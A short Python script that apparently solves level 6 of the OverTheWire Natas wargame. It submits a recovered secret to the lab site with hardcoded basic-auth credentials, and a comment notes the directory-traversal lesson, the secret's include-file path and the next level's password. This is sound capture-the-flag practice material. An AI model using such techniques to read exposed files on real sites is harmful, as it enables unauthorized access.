from bs4 import BeautifulSoup
import requests

def make():
    res = requests.post(url=url,auth=lvl_pass, data=my_params)
    soup = BeautifulSoup(res.text, 'html.parser')
    return (res, soup)
def writeResponse(enumerate = ''):
    with open(f'./response{enumerate}.html', 'w') as browserFile:
        browserFile.write(soup.prettify())
        
        
lvl_name = 'natas6'
url = f'http://{lvl_name}.natas.labs.overthewire.org'
lvl_pass = requests.auth.HTTPBasicAuth(f'{lvl_name}','fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR')
my_params = {'secret':'FOEIUWGHFEEUHOFUOIU', 'submit':'Submit'}


res, soup = make()
writeResponse()

'''
Another directory traversal lesson. Secret is located in includes/secret.inc
# Also apparently you use "data" instead of the "params" kwarg for requests.post.

Username: natas7
Password: jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr
 
'''